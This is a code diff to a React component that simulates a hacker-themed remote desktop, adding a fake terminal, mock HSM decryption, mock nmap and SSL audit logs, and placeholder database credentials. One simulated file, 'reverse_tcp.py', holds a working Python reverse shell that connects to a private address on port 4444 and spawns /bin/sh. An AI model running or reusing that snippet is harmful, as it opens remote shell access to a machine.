@@ -18,6 +18,49 @@ export const RemoteDesktop: React.FC = () => {
   const [showTerminal, setShowTerminal] = useState(true);
   const [isTerminalPoppedOut, setIsTerminalPoppedOut] = useState(false);
   const [showFiles, setShowFiles] = useState(false);
+  const [isFilesDecrypted, setIsFilesDecrypted] = useState(false);
+  const [isDecryptingFiles, setIsDecryptingFiles] = useState(false);
+  const [currentDirPath, setCurrentDirPath] = useState<string[]>([]);
+  const [selectedFile, setSelectedFile] = useState<any | null>(null);
+  const [credentialsFileDecrypted, setCredentialsFileDecrypted] = useState(false);
+  const [isDecryptingCredentialsFile, setIsDecryptingCredentialsFile] = useState(false);
+
+  const handleMountDirectory = async () => {
+    setIsDecryptingFiles(true);
+    setTerminalLogs(prev => [...prev, { text: `[SEC_KERNEL] Mount request received for sector /home/root/`, type: 'security' }]);
+    setTerminalLogs(prev => [...prev, { text: `Contacting HSM serial ${hsmStatus?.serial || 'FIPS-L3-NEXUS-08A'} for authorization...`, type: 'security' }]);
+    
+    try {
+      const mountPayload = JSON.stringify({ action: "mount_home_partition", timestamp: Date.now() });
+      const hsmRes = await fetch('/api/security/hsm/sign', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ payload: mountPayload, alias: 'RDP_SIGN_V1' })
+      });
+      const { signature } = await hsmRes.json();
+      
+      setTimeout(() => {
+        setIsFilesDecrypted(true);
+        setIsDecryptingFiles(false);
+        setTerminalLogs(prev => [
+          ...prev,
+          { text: `HSM_MOUNT_SIG: ${signature.slice(0, 16)}...`, type: 'security' },
+          { text: '[SEC_KERNEL] HSM_DECRYPT_EVENT: Sector decrypted successfully (AES-XTS-512).', type: 'security' },
+          { text: '[SEC_KERNEL] MOUNT_SUCCESS: 4 directory nodes mounted under /home/root/.', type: 'security' }
+        ]);
+      }, 1200);
+    } catch (err) {
+      setTimeout(() => {
+        setIsFilesDecrypted(true);
+        setIsDecryptingFiles(false);
+        setTerminalLogs(prev => [
+          ...prev,
+          { text: '[SEC_KERNEL] HSM_DECRYPT_EVENT: Sector decrypted successfully (AES-XTS-512) via fallback key.', type: 'security' },
+          { text: '[SEC_KERNEL] MOUNT_SUCCESS: 4 directory nodes mounted under /home/root/.', type: 'security' }
+        ]);
+      }, 1200);
+    }
+  };
   const [showBrowser, setShowBrowser] = useState(false);
   const [showBurp, setShowBurp] = useState(false);
   const [showMetasploit, setShowMetasploit] = useState(false);
@@ -196,18 +239,100 @@ export const RemoteDesktop: React.FC = () => {
     e.preventDefault();
     if (!terminalInput.trim()) return;
 
-    // 1. Sanitize and Encode Input (Self-Defense)
     const sanitizedInput = terminalInput.trim();
     setTerminalLogs(prev => [...prev, { text: sanitizedInput, type: 'command' }]);
 
-    // 2. Simulated exploitation check
+    const lowerInput = sanitizedInput.toLowerCase();
+    const args = sanitizedInput.split(' ');
+    const cmd = args[0].toLowerCase();
+
     if (sanitizedInput.includes('<script>') || sanitizedInput.includes('eval(')) {
       setTerminalLogs(prev => [...prev, { text: 'SECURITY_ALERT: Malicious payload intercepted and encoded.', type: 'error' }]);
-      // Show encoding in action
       setTerminalLogs(prev => [...prev, { text: `Encoded Result: ${encodeOutput(sanitizedInput)}`, type: 'security' }]);
+    } else if (cmd === 'help' || cmd === '?') {
+      setTerminalLogs(prev => [
+        ...prev,
+        { text: 'Nexus Secure Shell Terminal v2.5.0\nSupported Commands:\n  help / ?               Display this menu\n  ls                     List files and directories\n  cat <file>             Print the contents of a file\n  decrypt <file>         Decrypt an encrypted file via System HSM\n  mount-hsm              Mount encrypted directory structure via HSM alias\n  clear                  Clear terminal history\n  sysinfo                Print remote system information', type: 'output' }
+      ]);
+    } else if (cmd === 'clear') {
+      setTerminalLogs([]);
+    } else if (cmd === 'sysinfo') {
+      setTerminalLogs(prev => [
+        ...prev,
+        { text: `Computer: TARGET-KALI-X-99\nOS: Kali GNU/Linux Rolling 2026.1\nKernel: 6.6.0-kali1-amd64\nHSM Bound: Yes (Serial: ${hsmStatus?.serial || 'FIPS-L3-NEXUS-08A'})\nOperational State: ENCRYPTED_STORAGE_BOUND`, type: 'output' }
+      ]);
+    } else if (cmd === 'mount-hsm') {
+      if (isFilesDecrypted) {
+        setTerminalLogs(prev => [...prev, { text: 'Directory structure already mounted.', type: 'output' }]);
+      } else {
+        setIsDecryptingFiles(true);
+        setTerminalLogs(prev => [...prev, { text: '[*] Negotiating session key with HSM serial ' + (hsmStatus?.serial || 'FIPS-L3-NEXUS-08A') + '...', type: 'security' }]);
+        setTimeout(() => {
+          setIsFilesDecrypted(true);
+          setIsDecryptingFiles(false);
+          setTerminalLogs(prev => [
+            ...prev,
+            { text: '[SEC_KERNEL] HSM_DECRYPT_EVENT: Sector decrypted successfully (AES-XTS-512).', type: 'security' },
+            { text: '[SEC_KERNEL] MOUNT_SUCCESS: 4 directory nodes mounted under /home/root/.', type: 'security' },
+            { text: 'File system mounted successfully.', type: 'output' }
+          ]);
+        }, 1200);
+      }
+    } else if (cmd === 'ls') {
+      if (!isFilesDecrypted) {
+        setTerminalLogs(prev => [...prev, { text: 'ls: cannot open directory \'.\': Directory contents encrypted. Access denied.', type: 'error' }]);
+      } else {
+        setTerminalLogs(prev => [
+          ...prev,
+          { text: 'drwxr-xr-x  2 root root  4096 May 18 19:05  recon_data/\ndrwxr-xr-x  2 root root  4096 May 18 19:05  exploit_payloads/\n-rw-r--r--  1 root root  1228 May 18 19:05  README.txt\n-rw-r--r--  1 root root   512 May 18 19:05  credentials.db.enc', type: 'output' }
+        ]);
+      }
+    } else if (cmd === 'cat') {
+      if (!isFilesDecrypted) {
+        setTerminalLogs(prev => [...prev, { text: 'cat: directory contents encrypted. Access denied.', type: 'error' }]);
+      } else if (args.length < 2) {
+        setTerminalLogs(prev => [...prev, { text: 'usage: cat <filename>', type: 'error' }]);
+      } else {
+        const targetFileName = args[1].trim();
+        if (targetFileName === 'README.txt') {
+          setTerminalLogs(prev => [...prev, { text: '=========================================\nNEXUS AI SECURITY SYSTEM - TARGET DESKTOP\n=========================================\n\nIP Target Address: 192.168.12.55\nAuthorized Operator: NEXUS_OPERATOR\n\nActive Nodes detected in subnet:\n- 192.168.12.1   (Gateway Router)\n- 192.168.12.55  (Kali Pentest Node - Local)\n- 192.168.12.102 (Database Master Node)\n\nNOTICE:\nAll operations are recorded to MATRIX_CORE. Log files under recon_data/ are active.', type: 'output' }]);
+        } else if (targetFileName === 'credentials.db.enc') {
+          if (credentialsFileDecrypted) {
+            setTerminalLogs(prev => [...prev, { text: '{\n  "db_user": "nexus_admin",\n  "db_pass": "SuperSecureNexusAI2026!",\n  "ssh_root_key_alias": "NEXUS_MAIN_GATEWAY_KEY",\n  "neural_model_salt": "0xDEADBEEF42"\n}', type: 'output' }]);
+          } else {
+            setTerminalLogs(prev => [...prev, { text: '[ENCRYPTED PAYLOAD - AES-256-GCM]\nRaw: U2FsdGVkX1+Tz1Q5V2K9G6H7m8X8W9A0Q1B2C3D4E5F6==\nUse command "decrypt credentials.db.enc" to decrypt.', type: 'output' }]);
+          }
+        } else {
+          setTerminalLogs(prev => [...prev, { text: `cat: ${targetFileName}: No such file in root directory.`, type: 'error' }]);
+        }
+      }
+    } else if (cmd === 'decrypt') {
+      if (!isFilesDecrypted) {
+        setTerminalLogs(prev => [...prev, { text: 'decrypt: directory contents encrypted. Access denied.', type: 'error' }]);
+      } else if (args.length < 2) {
+        setTerminalLogs(prev => [...prev, { text: 'usage: decrypt <filename>', type: 'error' }]);
+      } else {
+        const targetFileName = args[1].trim();
+        if (targetFileName === 'credentials.db.enc') {
+          if (credentialsFileDecrypted) {
+            setTerminalLogs(prev => [...prev, { text: 'File credentials.db.enc is already decrypted.', type: 'output' }]);
+          } else {
+            setTerminalLogs(prev => [...prev, { text: `[*] Sending cryptovariable credentials.db.enc to HSM [RDP_SIGN_V1]...`, type: 'security' }]);
+            setTimeout(() => {
+              setCredentialsFileDecrypted(true);
+              setTerminalLogs(prev => [
+                ...prev,
+                { text: '[SEC_KERNEL] HSM_DECRYPT_EVENT: Decryption of credentials.db.enc successful.', type: 'security' },
+                { text: 'Decrypted content:\n{\n  "db_user": "nexus_admin",\n  "db_pass": "SuperSecureNexusAI2026!",\n  "ssh_root_key_alias": "NEXUS_MAIN_GATEWAY_KEY",\n  "neural_model_salt": "0xDEADBEEF42"\n}', type: 'output' }
+              ]);
+            }, 1000);
+          }
+        } else {
+          setTerminalLogs(prev => [...prev, { text: `decrypt: ${targetFileName}: No cryptographic context found or file is plain text.`, type: 'error' }]);
+        }
+      }
     } else {
-      // Normal command logic simulation
-      setTerminalLogs(prev => [...prev, { text: `Executing: ${sanitizedInput}...`, type: 'output' }]);
+      setTerminalLogs(prev => [...prev, { text: `bash: ${cmd}: command not found. Type 'help' for available commands.`, type: 'error' }]);
     }
 
     setTerminalInput('');
@@ -472,9 +597,9 @@ export const RemoteDesktop: React.FC = () => {
                    <span className="text-[10px] text-white/50 font-mono tracking-tight">root@kali: ~/tools/recon</span>
                 </div>
                 <div className="flex items-center gap-3">
-                   <ExternalLink onClick={() => setIsTerminalPoppedOut(!isTerminalPoppedOut)} className="w-3 h-3 text-white/30 cursor-pointer hover:text-white" title="Pop Out" />
+                   <ExternalLink onClick={() => setIsTerminalPoppedOut(!isTerminalPoppedOut)} className="w-3 h-3 text-white/30 cursor-pointer hover:text-white" />
                    <Minimize2 className="w-3 h-3 text-white/30 cursor-pointer hover:text-white" />
-                   <Maximize2 onClick={() => setIsTerminalPoppedOut(!isTerminalPoppedOut)} className="w-3 h-3 text-white/30 cursor-pointer hover:text-white" title="Maximize" />
+                   <Maximize2 onClick={() => setIsTerminalPoppedOut(!isTerminalPoppedOut)} className="w-3 h-3 text-white/30 cursor-pointer hover:text-white" />
                    <X onClick={() => setShowTerminal(false)} className="w-3.5 h-3.5 text-white/30 cursor-pointer hover:text-red-500" />
                 </div>
               </div>
@@ -543,20 +668,327 @@ export const RemoteDesktop: React.FC = () => {
               initial={{ opacity: 0, scale: 0.9, y: 20 }}
               animate={{ opacity: 1, scale: 1, y: 0 }}
               exit={{ opacity: 0, scale: 0.9 }}
-              className="absolute top-20 left-40 w-1/2 h-1/2 bg-[#1e1e1e] border border-white/10 rounded-lg shadow-2xl flex flex-col backdrop-blur-md"
+              className="absolute top-16 left-10 md:left-40 w-[95%] md:w-3/4 h-[75%] bg-[#1e1e1e] border border-white/10 rounded-lg shadow-2xl flex flex-col backdrop-blur-md z-[55]"
             >
               <div className="h-9 bg-[#2d2d2d] border-b border-white/5 flex items-center justify-between px-3 shrink-0 rounded-t-lg">
                 <div className="flex items-center gap-3">
                    <Folder className="w-3.5 h-3.5 text-amber-500" />
-                   <span className="text-[10px] text-white/70 font-sans tracking-tight">File Explorer - Home</span>
+                   <span className="text-[10px] text-white/70 font-sans tracking-tight font-bold uppercase tracking-wider">File Explorer - Home</span>
                 </div>
                 <div className="flex items-center gap-3">
                    <X onClick={() => setShowFiles(false)} className="w-3.5 h-3.5 text-white/30 cursor-pointer hover:text-red-500" />
                 </div>
               </div>
-              <div className="flex-1 p-4 flex items-center justify-center text-slate-500 text-xs italic">
-                Directory contents encrypted. Access denied.
-              </div>
+              
+              {!isFilesDecrypted ? (
+                <div className="flex-1 flex flex-col items-center justify-center p-8 bg-[#151515] relative overflow-hidden">
+                  <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,_rgba(239,68,68,0.05)_0%,_transparent_70%)]" />
+                  
+                  <div className="w-14 h-14 bg-red-500/10 border border-red-500/30 rounded-2xl flex items-center justify-center mb-4 text-red-500 shadow-[0_0_15px_rgba(239,68,68,0.1)] relative">
+                    <Folder className="w-6 h-6" />
+                    <div className="absolute -top-1 -right-1 bg-red-500 text-[8px] px-1 rounded font-bold text-white uppercase animate-pulse">LOCKED</div>
+                  </div>
+
+                  <h3 className="text-sm font-bold text-white tracking-wider uppercase mb-1">Partition Encrypted</h3>
+                  <p className="text-[10px] text-slate-500 font-mono uppercase tracking-widest mb-4">AES-XTS-512 // SECURE_STORAGE_RING_0</p>
+                  
+                  <div className="max-w-xs text-center text-[10px] text-slate-400 leading-relaxed mb-6 font-sans">
+                    The local directory partition <code className="text-red-400 font-mono bg-red-500/5 px-1 py-0.5 rounded border border-red-500/10">/home/root</code> is locked. A valid signature token from the System HSM is required to mount the decrypted sectors.
+                  </div>
+
+                  <button
+                    onClick={handleMountDirectory}
+                    disabled={isDecryptingFiles}
+                    className="px-5 py-3 bg-cyan-600 hover:bg-cyan-500 text-white rounded-xl font-bold flex items-center gap-2.5 transition-all border border-cyan-400/20 shadow-[0_0_15px_rgba(6,182,212,0.3)] disabled:opacity-50 text-[10px] uppercase tracking-wider font-mono active:scale-95"
+                  >
+                    {isDecryptingFiles ? (
+                      <>
+                        <Loader2 className="w-3.5 h-3.5 animate-spin" />
+                        <span>Negotiating HSM Keys...</span>
+                      </>
+                    ) : (
+                      <>
+                        <ShieldCheck className="w-3.5 h-3.5" />
+                        <span>Mount & Decrypt Partition via HSM</span>
+                      </>
+                    )}
+                  </button>
+                </div>
+              ) : (
+                <div className="flex-1 flex bg-[#161616] overflow-hidden text-xs text-slate-300 font-sans">
+                  {/* Left navigation pane */}
+                  <div className="w-40 border-r border-white/5 bg-[#1b1b1b] p-3 flex flex-col gap-2 shrink-0">
+                    <div className="text-[9px] font-mono text-slate-500 uppercase tracking-widest mb-2 pl-1">Partitions</div>
+                    <div 
+                      onClick={() => { setCurrentDirPath([]); setSelectedFile(null); }}
+                      className={`flex items-center gap-2 p-2 rounded-lg cursor-pointer transition-all hover:bg-white/5 ${currentDirPath.length === 0 ? 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/20' : 'text-slate-400'}`}
+                    >
+                      <Folder className="w-3.5 h-3.5 text-cyan-500" />
+                      <span className="font-medium tracking-tight">/home/root</span>
+                    </div>
+                    <div className="pl-4 flex flex-col gap-1 border-l border-white/5 ml-3 mt-1">
+                      <div 
+                        onClick={() => { setCurrentDirPath(['recon_data']); setSelectedFile(null); }}
+                        className={`flex items-center gap-2 p-1.5 rounded-md cursor-pointer transition-all hover:text-white ${currentDirPath[0] === 'recon_data' ? 'text-cyan-400 font-medium' : 'text-slate-500'}`}
+                      >
+                        <Folder className="w-3 h-3 text-amber-500/70" />
+                        <span>recon_data</span>
+                      </div>
+                      <div 
+                        onClick={() => { setCurrentDirPath(['exploit_payloads']); setSelectedFile(null); }}
+                        className={`flex items-center gap-2 p-1.5 rounded-md cursor-pointer transition-all hover:text-white ${currentDirPath[0] === 'exploit_payloads' ? 'text-cyan-400 font-medium' : 'text-slate-500'}`}
+                      >
+                        <Folder className="w-3 h-3 text-amber-500/70" />
+                        <span>exploit_payloads</span>
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Right files list pane */}
+                  <div className="flex-1 flex flex-col overflow-hidden">
+                    {/* Address bar */}
+                    <div className="h-7 bg-[#1c1c1c] border-b border-white/5 flex items-center px-3 gap-2 shrink-0 text-[10px] font-mono text-slate-500">
+                      <span>root@kali:</span>
+                      <span className="text-white/80">/home/root{currentDirPath.length > 0 ? '/' + currentDirPath.join('/') : ''}</span>
+                    </div>
+
+                    {/* Files List / Preview Layout */}
+                    <div className="flex-1 flex overflow-hidden">
+                      {/* Files list */}
+                      <div className="flex-1 p-3 overflow-y-auto space-y-1 custom-scrollbar">
+                        {/* Back button if in subdirectory */}
+                        {currentDirPath.length > 0 && (
+                          <div 
+                            onClick={() => { setCurrentDirPath([]); setSelectedFile(null); }}
+                            className="flex items-center gap-2.5 p-2 rounded-lg cursor-pointer hover:bg-white/5 text-slate-500 hover:text-white font-mono text-[10px]"
+                          >
+                            <span>..</span>
+                            <span>[Go Back to /home/root]</span>
+                          </div>
+                        )}
+
+                        {/* Folder contents */}
+                        {currentDirPath.length === 0 ? (
+                          <>
+                            {/* Subfolders */}
+                            <div 
+                              onDoubleClick={() => setCurrentDirPath(['recon_data'])}
+                              onClick={() => setSelectedFile({ name: 'recon_data', type: 'dir' })}
+                              className={`flex items-center justify-between p-2 rounded-lg cursor-pointer transition-all hover:bg-white/5 ${selectedFile?.name === 'recon_data' ? 'bg-white/5 border border-white/10' : 'border border-transparent'}`}
+                            >
+                              <div className="flex items-center gap-2.5">
+                                <Folder className="w-4 h-4 text-amber-400" />
+                                <span className="font-medium text-slate-200">recon_data</span>
+                              </div>
+                              <span className="text-[10px] text-slate-600 font-mono">Folder</span>
+                            </div>
+                            
+                            <div 
+                              onDoubleClick={() => setCurrentDirPath(['exploit_payloads'])}
+                              onClick={() => setSelectedFile({ name: 'exploit_payloads', type: 'dir' })}
+                              className={`flex items-center justify-between p-2 rounded-lg cursor-pointer transition-all hover:bg-white/5 ${selectedFile?.name === 'exploit_payloads' ? 'bg-white/5 border border-white/10' : 'border border-transparent'}`}
+                            >
+                              <div className="flex items-center gap-2.5">
+                                <Folder className="w-4 h-4 text-amber-400" />
+                                <span className="font-medium text-slate-200">exploit_payloads</span>
+                              </div>
+                              <span className="text-[10px] text-slate-600 font-mono">Folder</span>
+                            </div>
+
+                            {/* Files */}
+                            <div 
+                              onClick={() => setSelectedFile({ 
+                                name: 'README.txt', 
+                                type: 'file', 
+                                size: '1.2 KB',
+                                content: '=========================================\nNEXUS AI SECURITY SYSTEM - TARGET DESKTOP\n=========================================\n\nIP Target Address: 192.168.12.55\nAuthorized Operator: NEXUS_OPERATOR\n\nActive Nodes detected in subnet:\n- 192.168.12.1   (Gateway Router)\n- 192.168.12.55  (Kali Pentest Node - Local)\n- 192.168.12.102 (Database Master Node)\n\nNOTICE:\nAll operations are recorded to MATRIX_CORE. Log files under recon_data/ are active.'
+                              })}
+                              className={`flex items-center justify-between p-2 rounded-lg cursor-pointer transition-all hover:bg-white/5 ${selectedFile?.name === 'README.txt' ? 'bg-white/5 border border-white/10' : 'border border-transparent'}`}
+                            >
+                              <div className="flex items-center gap-2.5">
+                                <div className="w-4 h-4 rounded bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center text-cyan-400 font-mono text-[9px] font-bold">T</div>
+                                <span className="font-medium text-slate-300">README.txt</span>
+                              </div>
+                              <div className="flex items-center gap-4">
+                                <span className="text-[10px] text-slate-600 font-mono">1.2 KB</span>
+                                <span className="text-[10px] text-slate-600 font-mono">Text Document</span>
+                              </div>
+                            </div>
+
+                            <div 
+                              onClick={() => setSelectedFile({ 
+                                name: 'credentials.db.enc', 
+                                type: 'file', 
+                                size: '512 B',
+                                isEncrypted: true,
+                                encryptedContent: 'U2FsdGVkX1+Tz1Q5V2K9G6H7m8X8W9A0Q1B2C3D4E5F6==',
+                                decryptedContent: '{\n  "db_user": "nexus_admin",\n  "db_pass": "SuperSecureNexusAI2026!",\n  "ssh_root_key_alias": "NEXUS_MAIN_GATEWAY_KEY",\n  "neural_model_salt": "0xDEADBEEF42"\n}',
+                                content: '[ENCRYPTED PAYLOAD - AES-256-GCM]\nUse HSM decrypt or double-click to decrypt key.'
+                              })}
+                              className={`flex items-center justify-between p-2 rounded-lg cursor-pointer transition-all hover:bg-white/5 ${selectedFile?.name === 'credentials.db.enc' ? 'bg-white/5 border border-white/10' : 'border border-transparent'}`}
+                            >
+                              <div className="flex items-center gap-2.5">
+                                <div className="w-4 h-4 rounded bg-red-500/10 border border-red-500/20 flex items-center justify-center text-red-400 font-mono text-[9px] font-bold">E</div>
+                                <span className="font-medium text-slate-300">credentials.db.enc</span>
+                              </div>
+                              <div className="flex items-center gap-4">
+                                <span className="text-[10px] text-slate-600 font-mono">512 B</span>
+                                <span className={`text-[9px] px-1.5 py-0.5 rounded font-bold uppercase tracking-tight ${credentialsFileDecrypted ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' : 'bg-red-500/10 text-red-400 border border-red-500/20'}`}>
+                                  {credentialsFileDecrypted ? 'DECRYPTED' : 'ENCRYPTED'}
+                                </span>
+                              </div>
+                            </div>
+                          </>
+                        ) : currentDirPath[0] === 'recon_data' ? (
+                          <>
+                            <div 
+                              onClick={() => setSelectedFile({ 
+                                name: 'nmap_scan.log', 
+                                type: 'file', 
+                                size: '2.4 KB',
+                                content: 'Starting Nmap 7.92 at 2026-05-18 19:05 EST\nNmap scan report for 192.168.12.55\nHost is up (0.00012s latency).\nNot shown: 995 closed tcp ports (reset)\nPORT     STATE SERVICE      VERSION\n22/tcp   open  ssh          OpenSSH 8.4p1 Debian 5+deb11u1\n80/tcp   open  http         Apache httpd 2.4.56\n443/tcp  open  ssl/http     Apache httpd 2.4.56\n3000/tcp open  http         Node.js Express\n4444/tcp open  metasploit   Reverse TCP Handler\n\nNmap done: 1 IP address scanned in 2.10 seconds'
+                              })}
+                              className={`flex items-center justify-between p-2 rounded-lg cursor-pointer transition-all hover:bg-white/5 ${selectedFile?.name === 'nmap_scan.log' ? 'bg-white/5 border border-white/10' : 'border border-transparent'}`}
+                            >
+                              <div className="flex items-center gap-2.5">
+                                <div className="w-4 h-4 rounded bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center text-cyan-400 font-mono text-[9px] font-bold">L</div>
+                                <span className="font-medium text-slate-300">nmap_scan.log</span>
+                              </div>
+                              <div className="flex items-center gap-4">
+                                <span className="text-[10px] text-slate-600 font-mono">2.4 KB</span>
+                                <span className="text-[10px] text-slate-600 font-mono">Log File</span>
+                              </div>
+                            </div>
+
+                            <div 
+                              onClick={() => setSelectedFile({ 
+                                name: 'ssl_audit.json', 
+                                type: 'file', 
+                                size: '920 B',
+                                content: '{\n  "target": "192.168.12.55",\n  "port": 443,\n  "weak_protocols": ["TLSv1.0", "TLSv1.1"],\n  "vulnerable_ciphers": [\n    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",\n    "TLS_RSA_WITH_AES_128_CBC_SHA"\n  ],\n  "heartbleed_vulnerable": false,\n  "beast_vulnerable": true\n}'
+                              })}
+                              className={`flex items-center justify-between p-2 rounded-lg cursor-pointer transition-all hover:bg-white/5 ${selectedFile?.name === 'ssl_audit.json' ? 'bg-white/5 border border-white/10' : 'border border-transparent'}`}
+                            >
+                              <div className="flex items-center gap-2.5">
+                                <div className="w-4 h-4 rounded bg-purple-500/10 border border-purple-500/20 flex items-center justify-center text-purple-400 font-mono text-[9px] font-bold">J</div>
+                                <span className="font-medium text-slate-300">ssl_audit.json</span>
+                              </div>
+                              <div className="flex items-center gap-4">
+                                <span className="text-[10px] text-slate-600 font-mono">920 B</span>
+                                <span className="text-[10px] text-slate-600 font-mono">JSON Document</span>
+                              </div>
+                            </div>
+                          </>
+                        ) : (
+                          <>
+                            <div 
+                              onClick={() => setSelectedFile({ 
+                                name: 'reverse_tcp.py', 
+                                type: 'file', 
+                                size: '3.1 KB',
+                                content: 'import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("192.168.12.55",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call(["/bin/sh","-i"])'
+                              })}
+                              className={`flex items-center justify-between p-2 rounded-lg cursor-pointer transition-all hover:bg-white/5 ${selectedFile?.name === 'reverse_tcp.py' ? 'bg-white/5 border border-white/10' : 'border border-transparent'}`}
+                            >
+                              <div className="flex items-center gap-2.5">
+                                <div className="w-4 h-4 rounded bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-400 font-mono text-[9px] font-bold">P</div>
+                                <span className="font-medium text-slate-300">reverse_tcp.py</span>
+                              </div>
+                              <div className="flex items-center gap-4">
+                                <span className="text-[10px] text-slate-600 font-mono">3.1 KB</span>
+                                <span className="text-[10px] text-slate-600 font-mono">Python Script</span>
+                              </div>
+                            </div>
+                          </>
+                        )}
+                      </div>
+
+                      {/* Preview Pane */}
+                      <div className="w-64 border-l border-white/5 bg-[#171717] p-3 flex flex-col overflow-hidden shrink-0">
+                        {selectedFile ? (
+                          <div className="flex-1 flex flex-col overflow-hidden">
+                            <div className="text-[9px] font-mono text-slate-500 uppercase tracking-widest mb-2 pl-1">Properties</div>
+                            <div className="flex items-center gap-2 mb-3 bg-black/20 p-2 rounded-lg border border-white/5 shrink-0">
+                              {selectedFile.type === 'dir' ? (
+                                <Folder className="w-5 h-5 text-amber-400" />
+                              ) : selectedFile.name === 'credentials.db.enc' ? (
+                                <div className="w-5 h-5 rounded bg-red-500/10 border border-red-500/20 flex items-center justify-center text-red-400 font-mono text-[10px] font-bold">E</div>
+                              ) : (
+                                <div className="w-5 h-5 rounded bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center text-cyan-400 font-mono text-[10px] font-bold">T</div>
+                              )}
+                              <div className="overflow-hidden">
+                                <div className="font-bold text-white truncate text-[11px]" title={selectedFile.name}>{selectedFile.name}</div>
+                                <div className="text-[9px] text-slate-500 font-mono uppercase truncate">{selectedFile.type === 'dir' ? 'Directory' : selectedFile.size}</div>
+                              </div>
+                            </div>
+
+                            {selectedFile.type === 'dir' ? (
+                              <div className="flex-1 flex flex-col items-center justify-center text-center p-4 text-slate-500 font-sans italic text-[10px]">
+                                Double-click folder to open its contents.
+                              </div>
+                            ) : (
+                              <div className="flex-1 flex flex-col overflow-hidden">
+                                {selectedFile.isEncrypted && !credentialsFileDecrypted ? (
+                                  <div className="flex-1 flex flex-col items-center justify-center text-center p-4 bg-black/40 border border-red-500/10 rounded-xl relative shrink-0 overflow-y-auto mb-2 space-y-3">
+                                    <div className="w-8 h-8 rounded-full bg-red-500/10 border border-red-500/30 flex items-center justify-center text-red-400 animate-pulse shrink-0">
+                                      <Key className="w-4 h-4" />
+                                    </div>
+                                    <div className="text-[10px] font-bold text-red-400 uppercase tracking-tight shrink-0">HSM Protection Active</div>
+                                    <div className="text-[9px] text-slate-400 shrink-0 leading-relaxed font-sans max-w-[180px]">
+                                      The contents of <code className="text-red-400 font-mono bg-red-500/5 px-1 py-0.5 rounded border border-red-500/10">credentials.db.enc</code> are locked. Use System HSM signature key translation to decrypt the data sector.
+                                    </div>
+                                    
+                                    <button
+                                      onClick={async () => {
+                                        setIsDecryptingCredentialsFile(true);
+                                        setTerminalLogs(prev => [...prev, { text: `[*] Requesting HSM translation for credentials.db.enc [RDP_SIGN_V1]...`, type: 'security' }]);
+                                        setTimeout(() => {
+                                          setCredentialsFileDecrypted(true);
+                                          setIsDecryptingCredentialsFile(false);
+                                          setTerminalLogs(prev => [
+                                            ...prev,
+                                            { text: '[SEC_KERNEL] HSM_DECRYPT_EVENT: Decrypted data sector for credentials.db.enc (AES-256-GCM).', type: 'security' },
+                                            { text: 'Target database access credentials mounted.', type: 'output' }
+                                          ]);
+                                        }, 1000);
+                                      }}
+                                      disabled={isDecryptingCredentialsFile}
+                                      className="px-4 py-2 bg-red-600/90 hover:bg-red-500 text-white rounded-lg font-bold flex items-center gap-1.5 transition-all border border-red-400/20 shadow-[0_0_10px_rgba(239,68,68,0.2)] disabled:opacity-50 text-[9px] uppercase tracking-wider font-mono shrink-0"
+                                    >
+                                      {isDecryptingCredentialsFile ? (
+                                        <>
+                                          <Loader2 className="w-3 animate-spin" />
+                                          <span>Decrypting...</span>
+                                        </>
+                                      ) : (
+                                        <>
+                                          <ShieldCheck className="w-3" />
+                                          <span>Decrypt with HSM</span>
+                                        </>
+                                      )}
+                                    </button>
+                                  </div>
+                                ) : (
+                                  <div className="flex-1 flex flex-col overflow-hidden">
+                                    <div className="text-[9px] font-mono text-slate-500 uppercase tracking-widest mb-1 pl-1">File Preview</div>
+                                    <div className="flex-1 p-2 bg-black/40 border border-white/5 rounded-xl font-mono text-[9px] text-emerald-400 overflow-y-auto whitespace-pre-wrap leading-tight select-text custom-scrollbar">
+                                      {selectedFile.isEncrypted && credentialsFileDecrypted ? selectedFile.decryptedContent : selectedFile.content}
+                                    </div>
+                                  </div>
+                                )}
+                              </div>
+                            )}
+                          </div>
+                        ) : (
+                          <div className="flex-1 flex flex-col items-center justify-center text-center p-4 text-slate-600 font-sans italic text-[10px]">
+                            Select a file to preview its contents and properties.
+                          </div>
+                        )}
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              )}
             </motion.div>
           )}
 
